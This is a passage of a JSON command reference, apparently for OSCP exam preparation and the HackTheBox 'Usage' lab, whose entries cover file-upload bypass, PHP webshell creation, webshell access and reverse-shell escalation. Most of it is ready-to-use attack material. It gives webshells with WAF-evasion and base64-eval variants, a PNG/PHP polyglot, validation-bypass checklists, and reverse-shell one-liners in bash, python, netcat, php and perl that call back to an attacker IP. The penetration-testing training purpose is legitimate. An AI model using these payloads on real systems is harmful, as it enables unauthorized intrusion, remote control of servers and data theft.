with Burp\n4. Modify:\n   filename=\"shell.php\"\n   Content-Type: image/png\n5. Forward → Upload successful\n6. Find upload directory:\n   View profile page source\n   → <img src=\"/avatars/shell.php\">\n7. Access webshell:\n   http://target/avatars/shell.php?cmd=whoami\n   → www-data\n8. Execute reverse shell:\n   http://target/avatars/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27\n   → Shell received\n\nPolyglot file creation:\n# Create PNG with PHP code\nprintf '\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x01\\x00\\x00\\x00\\x007n\\xf9$\\x00\\x00\\x00\\nIDATx\\x9cc`\\x00\\x00\\x00\\x02\\x00\\x01H\\xaf\\xa4q\\x00\\x00\\x00\\x00IEND\\xaeB`\\x82<?php system($_GET[\"cmd\"]); ?>' > shell.php.png\n\n# Upload shell.php.png\n# Access as PHP:\nhttp://target/uploads/shell.php.png?cmd=id\n→ If server executes PHP in images directory, RCE\n\nAlternate extensions to test:\n.php → Blocked\n.phtml → Try this\n.php3 → Try this  \n.php4 → Try this\n.php5 → Try this\n.phar → Try this\n.phps → Try this\n\nBypass validation checklist:\n□ Content-Type: image/png, image/jpeg, image/gif\n□ Filename: shell.php.png, shell.png.php, shell.php%00.png\n□ Extension: .phtml, .php3, .php4, .php5\n□ Path traversal: ../../../uploads/shell.php\n□ Case variation: shell.PhP, shell.Php\n□ Magic bytes: Add PNG header to PHP file\n□ Double upload: Upload image first, then PHP with same name\n\nVerifying upload:\n# Check if file uploaded\ncurl http://target/uploads/shell.php\n\n# Test command execution  \ncurl http://target/uploads/shell.php?cmd=id\n→ uid=33(www-data) gid=33(www-data)\n\n# Get reverse shell\ncurl 'http://target/uploads/shell.php?cmd=bash%20-c%20\"bash%20-i%20>%26%20/dev/tcp/10.10.14.5/9001%200>%261\"'\n\nOSCP exam tip: File upload = HIGH priority target. Immediately test with Burp modification. Try Content-Type bypass first (fastest). If rejected, try double extension, then alternate extensions. Document upload directory location. One successful webshell upload = guaranteed RCE.\n\nTime estimate: 2-5 minutes (bypass testing) + 1 minute (RCE verification)",
      "oscp_relevance": "high"
    },
    {
      "id": "create-php-webshell",
      "name": "Create PHP Webshell",
      "category": "web",
      "subcategory": "webshell",
      "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
      "description": "Create simple PHP webshell for command execution after file upload bypass or arbitrary file write vulnerability",
      "tags": [
        "FILE_UPLOAD",
        "OSCP:HIGH",
        "PHP",
        "RCE",
        "WEB",
        "WEBSHELL"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Shell file created",
        "File uploaded successfully",
        "Commands execute when accessed",
        "Output visible in browser"
      ],
      "failure_indicators": [
        "PHP code displayed as text (not executed)",
        "File not accessible (404)",
        "PHP execution disabled",
        "WAF blocking"
      ],
      "next_steps": [
        "web-access-uploaded-file",
        "webshell-execute-revshell",
        "burpsuite-modify-upload"
      ],
      "alternatives": [
        "<?php echo shell_exec($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php exec($_GET['cmd'], $output); print_r($output); ?>"
      ],
      "prerequisites": [
        "burpsuite-modify-upload"
      ],
      "troubleshooting": {
        "code_shown_not_executed": "PHP not enabled in upload directory. Check .htaccess: AddType application/x-httpd-php .png. Or find PHP-enabled directory",
        "file_not_found": "Upload failed or wrong location. Check upload response for path. Try gobuster to find uploads directory",
        "no_output": "Command executed but no output captured. Try different PHP function: shell_exec, passthru, exec. Or check if output being suppressed",
        "waf_blocking": "WAF detecting 'system', 'exec' keywords. Obfuscate: <?php $a='sys'.'tem'; $a($_GET['c']); ?>. Or base64 encode payload"
      },
      "notes": "PHP WEBSHELL: Minimal code for maximum RCE.\n\nWebshell variations:\n(1) Minimal (THIS COMMAND)\n    <?php system($_GET['cmd']); ?>\n    Usage: shell.php?cmd=whoami\n    → Smallest, easiest to upload\n\n(2) Shell_exec (better output handling)\n    <?php echo shell_exec($_GET['cmd']); ?>\n    Usage: shell.php?cmd=ls -la\n    → Returns full output including stderr\n\n(3) Passthru (binary-safe)\n    <?php passthru($_GET['cmd']); ?>\n    Usage: shell.php?cmd=cat /etc/passwd\n    → Good for binary files\n\n(4) Exec (array output)\n    <?php exec($_GET['cmd'], $output); print_r($output); ?>\n    Usage: shell.php?cmd=id\n    → Returns array of output lines\n\n(5) Multi-parameter  \n    <?php system($_POST['cmd']); ?>\n    Usage: curl -X POST -d 'cmd=whoami' http://target/shell.php\n    → Harder to detect in logs\n\n(6) Obfuscated (bypass WAF)\n    <?php $a='sys'.'tem'; $a($_GET['c']); ?>\n    Usage: shell.php?c=id\n    → Evades simple keyword detection\n\n(7) Base64 encoded\n    <?php eval(base64_decode($_GET['c'])); ?>\n    Usage: shell.php?c=c3lzdGVtKCdpZCcp\n    → Very evasive\n\n(8) Full-featured (not minimal)\n    <?php\n    if(isset($_GET['cmd'])) {\n      $cmd = $_GET['cmd'];\n      echo \"<pre>\";\n      system($cmd);\n      echo \"</pre>\";\n    }\n    ?>\n    → Better formatting, safer\n\nWebshell upload workflow:\n1. Create webshell (THIS COMMAND)\n   echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php\n\n2. Upload via file upload\n   Navigate to upload form\n   Select shell.php\n   Intercept with Burp\n   Modify Content-Type to image/png\n   Forward\n   → Upload successful\n\n3. Find upload location\n   Check response: {\"path\":\"/uploads/shell.php\"}\n   Or check page source\n   Or gobuster\n\n4. Access webshell\n   http://target/uploads/shell.php?cmd=whoami\n   → www-data\n\n5. Execute commands\n   http://target/uploads/shell.php?cmd=id\n   http://target/uploads/shell.php?cmd=pwd\n   http://target/uploads/shell.php?cmd=ls -la\n\n6. Get reverse shell\n   http://target/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'\n   → Full interactive shell\n\nCommand execution via webshell:\n# URL encode special characters\nwhoami → whoami\nls -la → ls%20-la\ncat /etc/passwd → cat%20/etc/passwd\nid → id\n\n# Complex commands need full URL encoding\nbash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'\n→ bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27\n\nUsing curl for webshell:\n# GET request\ncurl 'http://target/shell.php?cmd=whoami'\n→ www-data\n\n# POST request (stealthier)\ncurl -X POST -d 'cmd=id' http://target/shell.php\n→ uid=33(www-data)\n\n# Reverse shell via webshell\ncurl 'http://target/shell.php?cmd=bash%20-c%20\"bash%20-i%20>%26%20/dev/tcp/10.10.14.5/9001%200>%261\"'\n\nOSCP HackTheBox Usage machine workflow:\n1. Admin panel avatar upload\n2. Create shell.php (THIS COMMAND)\n3. Upload → Rejected\n4. Burp intercept\n5. Change Content-Type: image/png\n6. Forward → Success\n7. Access: http://usage.htb/avatars/shell.php?cmd=id\n   → uid=33(www-data)\n8. Reverse shell:\n   nc -lvnp 9001  # Attacker\n   http://usage.htb/avatars/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'\n   → Shell received\n\nAdvanced webshell features:\n# File browser\n<?php\nif(isset($_GET['path'])) {\n  $files = scandir($_GET['path']);\n  print_r($files);\n}\n?>\nUsage: shell.php?path=/var/www/html\n\n# File read\n<?php\nif(isset($_GET['file'])) {\n  echo file_get_contents($_GET['file']);\n}\n?>\nUsage: shell.php?file=/etc/passwd\n\n# Command + file operations\n<?php\nif(isset($_GET['cmd'])) system($_GET['cmd']);\nif(isset($_GET['file'])) echo file_get_contents($_GET['file']);\n?>\n\nWebshell detection evasion:\n(1) Rename function\n    $a='sys'.'tem'; $a($_GET['c']);\n\n(2) Variable function name\n    $f=$_GET['f']; $f($_GET['c']);\n    Usage: shell.php?f=system&c=id\n\n(3) Preg_replace (deprecated but works)\n    preg_replace('/.*/e', $_GET['c'], '');\n\n(4) Assert (disabled in PHP 7.2+)\n    assert($_GET['c']);\n\n(5) Create_function (deprecated)\n    $f=create_function('',$_GET['c']); $f();\n\nTroubleshooting PHP execution:\n# Check if PHP enabled\ncurl http://target/test.php\n→ If code displayed = not enabled\n→ If executed = enabled\n\n# Check upload directory for PHP execution\nCreate .htaccess in uploads/:\nAddType application/x-httpd-php .png\n→ Enables PHP execution for .png files\n\n# Alternative upload locations\n/var/www/html/ (web root, usually executable)\n/tmp/ (writable but not web-accessible)\n/var/tmp/ (writable but not web-accessible)\n\nOSCP exam tip: Create webshell BEFORE exam (save as template). Test upload immediately when finding upload form. Minimal webshell easier to upload (fewer WAF triggers). URL-encode reverse shell command before using in webshell. Document webshell location in breakthrough.md.\n\nTime estimate: 30 seconds (creation) + 1-2 minutes (upload and testing)",
      "oscp_relevance": "high"
    },
    {
      "id": "web-access-uploaded-file",
      "name": "Access Uploaded Webshell",
      "category": "web",
      "subcategory": "webshell",
      "command": "curl 'http://<TARGET>/uploads/<FILENAME>?cmd=<COMMAND>'",
      "description": "Access uploaded PHP webshell via HTTP request to execute commands and verify RCE",
      "tags": [
        "OSCP:HIGH",
        "RCE",
        "WEB",
        "WEBSHELL"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target web server hostname or IP",
          "example": "usage.htb",
          "required": true
        },
        {
          "name": "<FILENAME>",
          "description": "Uploaded webshell filename",
          "example": "shell.php",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "System command to execute (URL-encoded)",
          "example": "whoami",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "Command output returned",
        "www-data or similar user shown",
        "File contents displayed (for cat commands)",
        "Directory listing shown (for ls commands)"
      ],
      "failure_indicators": [
        "404 Not Found (wrong path)",
        "PHP code displayed (not executed)",
        "Empty response (execution disabled)",
        "403 Forbidden (permission denied)"
      ],
      "next_steps": [
        "webshell-execute-revshell",
        "pty-spawn-script"
      ],
      "alternatives": [
        "Browse to URL in browser",
        "wget http://target/uploads/shell.php?cmd=id"
      ],
      "prerequisites": [
        "create-php-webshell",
        "burpsuite-modify-upload"
      ],
      "troubleshooting": {
        "file_not_found": "Wrong upload path. Check upload response for actual location. Try common paths: /uploads, /files, /avatars, /images. Use gobuster to find directory",
        "php_code_displayed": "PHP execution disabled in upload directory. Try different upload location. Check if .htaccess can enable PHP. Look for path traversal during upload",
        "no_output": "Command executed but no output. Try: echo shell_exec() instead of system(). Or check for output suppression. Verify with: shell.php?cmd=echo success",
        "special_chars_broken": "URL encoding issue. Encode command properly: spaces=%20, &=%26, |=%7C. Use curl with quotes: curl 'http://...' not curl http://..."
      },
      "notes": "WEBSHELL ACCESS → COMMAND EXECUTION → REVERSE SHELL: Standard RCE workflow.\n\nWebshell access methods:\n(1) curl (THIS COMMAND)\n    curl 'http://target/uploads/shell.php?cmd=whoami'\n    → Best for scripting and reverse shells\n\n(2) Browser\n    http://target/uploads/shell.php?cmd=whoami\n    → Good for interactive testing\n\n(3) wget\n    wget -q -O - 'http://target/uploads/shell.php?cmd=id'\n    → Alternative to curl\n\n(4) Python requests\n    import requests\n    r = requests.get('http://target/uploads/shell.php', params={'cmd':'id'})\n    print(r.text)\n\nCommon commands to test:\n# Verify execution\nwhoami → www-data, apache, nginx\nid → uid=33(www-data) gid=33(www-data)\npwd → /var/www/html/uploads\n\n# System enumeration\nuname -a → Linux info\nhostname → target hostname\ncat /etc/passwd → User list\nls -la /home → Home directories\n\n# Network enumeration  \nifconfig / ip a → IP addresses\nnetstat -tulpn → Listening ports\nps aux → Running processes\n\n# File system\nls -la → Current directory\ncat /etc/passwd → Users\nfind / -perm -4000 2>/dev/null → SUID binaries\n\nURL encoding for webshells:\nSpaces: %20 or +\nForward slash: %2F\nAmpersand: %26\nPipe: %7C\nSemicolon: %3B\nGreater than: %3E\nLess than: %3C\nSingle quote: %27\nDouble quote: %22\n\nURL encoding examples:\n# Simple command (no encoding needed)\nwhoami → whoami\nid → id\npwd → pwd\n\n# Command with spaces\nls -la → ls%20-la\ncat /etc/passwd → cat%20/etc/passwd\n\n# Complex command with pipes/redirects\nls -la | grep user → ls%20-la%20%7C%20grep%20user\ncat /etc/passwd | cut -d: -f1 → cat%20/etc/passwd%20%7C%20cut%20-d%3A%20-f1\n\n# Reverse shell (full encoding)\nbash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'\n→ bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27\n\nFinding upload directory:\n(1) Check upload response\n    → {\"status\":\"success\",\"file\":\"/uploads/shell.php\"}\n\n(2) View page source\n    → <img src=\"/avatars/profile.png\">\n    → Try /avatars/shell.php\n\n(3) Gobuster\n    gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt\n    → /uploads (Status: 200)\n\n(4) Common paths\n    /uploads/, /upload/, /files/, /images/, /media/,\n    /avatars/, /pictures/, /assets/, /public/uploads/\n\nOSCP workflow:\n1. Create webshell\n   echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php\n\n2. Upload with Burp bypass\n   Intercept, modify Content-Type, forward\n\n3. Find upload path\n   Check response or gobuster\n\n4. Test webshell (THIS COMMAND)\n   curl 'http://target/uploads/shell.php?cmd=whoami'\n   → www-data\n\n5. Enumerate system\n   curl 'http://target/uploads/shell.php?cmd=id'\n   curl 'http://target/uploads/shell.php?cmd=uname -a'\n   curl 'http://target/uploads/shell.php?cmd=ls -la /home'\n\n6. Get reverse shell\n   nc -lvnp 9001  # Attacker\n   curl 'http://target/uploads/shell.php?cmd=bash -c \"bash -i >& /dev/tcp/10.10.14.5/9001 0>&1\"'\n   → Full shell received\n\nDebugging webshell access:\n# Test 1: Does file exist?\ncurl -I http://target/uploads/shell.php\n→ 200 OK = File exists\n→ 404 Not Found = Wrong path\n\n# Test 2: Is PHP executing?\ncurl http://target/uploads/shell.php\n→ If you see PHP code = Not executing\n→ If empty or error = Executing but no output\n\n# Test 3: Simple command\ncurl 'http://target/uploads/shell.php?cmd=echo success'\n→ \"success\" = Working\n\n# Test 4: Check user\ncurl 'http://target/uploads/shell.php?cmd=whoami'\n→ www-data = Executing as web user\n\nQuick enumeration via webshell:\n# One-liner for multiple commands\nfor cmd in whoami id pwd \"uname -a\" \"ls -la\"; do\n  echo \"[+] $cmd\"\n  curl -s \"http://target/uploads/shell.php?cmd=$cmd\"\n  echo\ndone\n\nOSCP exam tip: Test webshell with simple command first (whoami) before complex reverse shell. Save working webshell URL in notes. Use curl for automation, browser for interactive testing. If webshell works, immediately escalate to reverse shell (easier to work with).\n\nTime estimate: 30 seconds (verification) + 2-5 minutes (enumeration)",
      "oscp_relevance": "high"
    },
    {
      "id": "webshell-execute-revshell",
      "name": "Execute Reverse Shell via Webshell",
      "category": "web",
      "subcategory": "webshell",
      "command": "curl 'http://<TARGET>/uploads/<WEBSHELL>?cmd=bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'",
      "description": "Execute reverse shell command through webshell to upgrade from command execution to full interactive shell",
      "tags": [
        "EXPLOITATION",
        "OSCP:HIGH",
        "RCE",
        "REVERSE_SHELL",
        "WEB",
        "WEBSHELL"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target web server hostname or IP",
          "example": "usage.htb",
          "required": true
        },
        {
          "name": "<WEBSHELL>",
          "description": "Uploaded webshell filename with path",
          "example": "shell.php",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP address for reverse shell callback",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker listening port for reverse shell",
          "example": "9001",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "Netcat listener receives connection",
        "Shell prompt appears ($ or #)",
        "whoami shows web user (www-data, apache, nginx)",
        "Interactive shell with command execution"
      ],
      "failure_indicators": [
        "No connection received",
        "Connection immediately closes",
        "bash: command not found",
        "Firewall blocking outbound connections"
      ],
      "next_steps": [
        "pty-spawn-script",
        "linux-enumerate-users",
        "check-sudo-privs"
      ],
      "alternatives": [
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "nc LHOST LPORT -e /bin/bash"
      ],
      "prerequisites": [
        "nc-listener",
        "web-access-uploaded-file"
      ],
      "troubleshooting": {
        "no_connection": "Firewall blocking egress. Try different ports (80, 443, 53). Verify LHOST reachable from target. Check listener running: netstat -tulpn | grep LPORT",
        "bash_not_found": "Bash not available. Try alternatives: sh, /bin/sh, python, nc. Check available shells: cat /etc/shells",
        "connection_closes": "Shell dying immediately. Upgrade to PTY: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'. Or use stable payload (socat, meterpreter)",
        "url_encoding_issues": "Special characters breaking command. Proper encoding: spaces=%20, &=%26, |=%7C, >=%3E. Use single quotes in curl: curl 'http://...' not curl http://..."
      },
      "notes": "WEBSHELL → REVERSE SHELL: Upgrade to full interactive shell.\n\nWHY upgrade to reverse shell:\n(1) Interactive: Tab completion, job control, text editors work\n(2) Persistent: Doesn't timeout like webshell HTTP requests\n(3) Stable: Less prone to connection drops\n(4) Functional: Can run interactive commands (su, sudo, ssh)\n(5) Faster: No URL encoding, direct command execution\n\nReverse shell workflow:\n1. Start listener on attacker\n   nc -lvnp 9001\n   → Listening on 0.0.0.0 9001\n\n2. Execute reverse shell via webshell (THIS COMMAND)\n   curl 'http://target/uploads/shell.php?cmd=bash -c \"bash -i >& /dev/tcp/10.10.14.5/9001 0>&1\"'\n\n3. Receive connection\n   Connection from 10.10.11.18:54321\n   www-data@target:/$\n\n4. Upgrade to PTY\n   python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n   Ctrl+Z\n   stty raw -echo; fg\n   export TERM=xterm\n\n5. Begin enumeration\n   whoami, id, sudo -l, ls -la /home\n\nReverse shell payloads:\n(1) Bash TCP (THIS COMMAND)\n    bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'\n    → Most common, works on most Linux\n\n(2) Bash UDP  \n    bash -c 'bash -i >& /dev/udp/LHOST/LPORT 0>&1'\n    → Alternative if TCP blocked\n\n(3) Python3\n    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n    → When bash not available\n\n(4) Python2\n    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n(5) Netcat (traditional)\n    nc LHOST LPORT -e /bin/bash\n    → If nc compiled with -e support\n\n(6) Netcat (no -e)\n    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f\n    → Works on all nc versions\n\n(7) PHP\n    php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n(8) Perl\n    perl -e 'use Socket;$i=\"LHOST\";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\nURL encoding for curl:\nbash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'\n→ bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27\n\nFull command (properly encoded):\ncurl 'http://target/uploads/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27'\n\nOr use revshells.com:\n1. Visit https://www.revshells.com/\n2. Select \"Bash TCP\"\n3. Enter LHOST and LPORT\n4. Copy URL-encoded payload\n5. Paste into webshell URL\n\nTroubleshooting no connection:\n(1) Verify listener running\n    netstat -tulpn | grep 9001\n    → Should show LISTEN\n\n(2) Check target can reach attacker\n    # Via webshell\n    curl 'http://target/shell.php?cmd=ping -c 1 10.10.14.5'\n    → Verify ICMP\n\n(3) Try different ports\n    Common egress ports: 80, 443, 53, 8080, 8443\n    nc -lvnp 443  # Attacker (requires root for <1024)\n    # Update payload with new port\n\n(4) Try alternative payload\n    Python instead of bash\n    UDP instead of TCP\n    Socat for encrypted shell\n\n(5) Check firewall rules\n    # Via webshell\n    curl 'http://target/shell.php?cmd=iptables -L'\n    → Check OUTPUT chain\n\nMultiple attempts:\n# Try ports 80, 443, 53, 9001\nfor port in 80 443 53 9001; do\n  echo \"[+] Trying port $port\"\n  nc -lvnp $port &\n  sleep 2\n  curl \"http://target/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/$port 0>&1'\"\n  sleep 5\n  killall nc\ndone\n\nOSCP HackTheBox Usage workflow:\n1. Webshell uploaded: http://usage.htb/avatars/shell.php\n2. Start listener:\n   nc -lvnp 9001\n3. Execute reverse shell (THIS COMMAND):\n   curl 'http://usage.htb/avatars/shell.php?cmd=bash -c \"bash -i >& /dev/tcp/10.10.14.5/9001 0>&1\"'\n4. Connection received:\n   www-data@usage:/$\n5. Upgrade shell:\n   python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n   Ctrl+Z\n   stty raw -echo; fg\n   export TERM=xterm\n6. Enumerate:\n   whoami → www-data\n   id → uid=33(www-data)\n   ls -la /home → Users: dash, xander\n\nOSCP exam tip: Have reverse shell payload ready before exam (save in notes). Use revshells.com for URL-encoded payloads. Try port 443 first (commonly allowed outbound). Immediately upgrade to PTY after connection. If reverse shell fails, continue with webshell but prioritize finding egress path.\n\nTime estimate: 30 seconds (execution) + 30 seconds (shell upgrade)",
      "oscp_relevance": "high"
    }
  ]
}
